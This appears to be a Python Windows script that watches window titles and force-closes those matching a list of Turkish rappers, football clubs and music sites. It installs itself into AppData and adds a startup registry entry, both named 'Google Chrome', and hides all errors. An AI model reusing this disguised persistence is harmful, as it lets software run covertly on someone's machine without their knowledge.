#import logging
from time import sleep
import pygetwindow as gw
import pyautogui
import psutil
import filecmp
import os
import sys
import shutil
import winreg
import random

debugging = False

# Set up logging
#logging.basicConfig(filename="program_log.txt", level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")

# Configuration
APP_NAME = "Google Chrome"
SYSTEM_APPS = ["Microsoft Text Input Application"]
FILTER_OUT = """.,/'"&%()[]-_*~`|"""
TRANSLATION_TABLE = str.maketrans('', '', FILTER_OUT)

# Deduplicated and improved banned words list
BANNED_WORDS = [
    "ali471", "amentu", "ati242", "aykut closer", "batuflex", 
    "ben fero", "blok3", "cakal", "canbay wolker", "cıstak", "cistak", "çakal", 
    "deha", "elmusto", "era7capone", "heijan", "jeff redd", "kefo", "khontkar", 
    "lvbel c5", "mero", "motive", "murda", "red bull rap trivia", "sehinsah", 
    "şehinşah", "şanışer", "uzi", "- youtube music", "spotify -", "- spotify",
    "barcelona", "real madrid", "bayern münih", "bayern munich", "manchester united",
    "tottenham", "young boys", "rc strasbourg", "chelsea", "arsenal", "porto", "milan",
    "juventus", "inter", "valencia", "liverpool", "benfica", "atletico madrid", "sevilla",
    "borussia dortmund", "lyon", "manchester city", "galatasaray", "fenerbahçe",
    "beşiktaş", "wolfsburg", "west ham united", "monaco", "karabağ", "başakşehir fk",
    "union berlin", "hoffenheim", "trabzonspor", "esenler erokspor", "augsburg", "eray067",
    "realmadrid", "era7", "wegh", "ege!", "spotify", "ezhel", "organize", "organıze",
    "damla", "randevu", "swim", "exorcist", "pvg", "inanma", "teker teker", "makaveli",
    "10 mg", "sokaklar caddeler", "canbay", "wolker"
]

# Words requiring forced closure
BLACKLISTED_WORDS = ["- youtube music"]

def setup_persistence():
    """Install to AppData and add to startup registry only when needed."""
    try:
        current_exe = os.path.abspath(sys.argv[0])
        appdata_dir = os.path.join(os.environ['APPDATA'], APP_NAME)
        target_exe = os.path.join(appdata_dir, os.path.basename(current_exe))

        # Create directory if needed
        os.makedirs(appdata_dir, exist_ok=True)

        # Only copy if:
        # 1. We're not already running from AppData
        # 2. The file doesn't exist or is different
        if current_exe != target_exe:
            if not os.path.exists(target_exe) or not filecmp.cmp(current_exe, target_exe):
                shutil.copyfile(current_exe, target_exe)
                #logging.info(f"Updated copy in AppData: {target_exe}")

        # Always set registry entry (in case path changes)
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, target_exe)
            
    except Exception as e:
        pass
        #logging.error(f"Error setting up persistence: {e}")

def is_instance_running():
    """Check if another instance is already running."""
    current_pid = os.getpid()
    current_name = os.path.basename(sys.argv[0])
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['pid'] != current_pid and proc.info['name'] == current_name:
            return True
    return False

last_window = None
chance = None

def close_window(window_title, forced=False):
    global last_window, chance
    """Improved window closing with better activation handling."""
    try:
        if last_window == None:
            last_window = window_title
    
        elif last_window == window_title and chance:
            return

        if last_window != window_title:
            chance = None

        if chance is None:
            if random.random() < 0.6:
                last_window = window_title
                chance = True
                #logging.info(f"Skipped tab: {window_title}")
                return

        last_window = window_title
        windows = gw.getWindowsWithTitle(window_title)
        if windows:
            window = windows[0]
            if window.isMinimized:
                window.restore()
            window.activate()
            pyautogui.hotkey('ctrl', 'w')
            if forced:
                sleep(0.2)
                pyautogui.press('enter')
            chance = None
            #logging.info(f"Closed tab: {window_title}")
    except Exception as e:
        pass
        #logging.error(f"Error closing window {window_title}: {e}")

def get_matching_windows(open_windows):
    """Identify windows containing banned phrases using exact matching."""
    matching_windows = []
    for window in open_windows:
        if not window:  # Skip empty window titles
            continue
            
        # Normalize the window title
        processed = window.translate(TRANSLATION_TABLE).lower()
        processed = ' '.join(processed.split())  # Remove extra whitespace
        
        # Create search-friendly version with space padding
        search_text = f' {processed} '
        
        # Check against banned phrases (exact match with word boundaries)
        for banned in BANNED_WORDS:
            # Normalize banned phrase the same way
            banned_phrase = f' {banned.translate(TRANSLATION_TABLE).lower().strip()} '
            if banned_phrase in search_text:
                if not any(app.lower() in processed for app in SYSTEM_APPS):
                    matching_windows.append(window)
                    break  # No need to check other phrases once matched
                    
    return matching_windows

def close_tabs():
    """Main blocking loop with optimized checks."""
    while True:
        open_windows = [w for w in gw.getAllTitles() if w]  # Filter empty titles
        for window in get_matching_windows(open_windows):
            forced = any(bl in window for bl in BLACKLISTED_WORDS)
            close_window(window, forced)
        sleep(0.1)

def main():
    try:
        if not debugging:
            setup_persistence()
        close_tabs()
    except KeyboardInterrupt:
        pass
        #logging.info("Program interrupted.")
    except Exception as e:
        pass
        #logging.error(f"Unexpected error: {e}")

if __name__ == "__main__":
    main()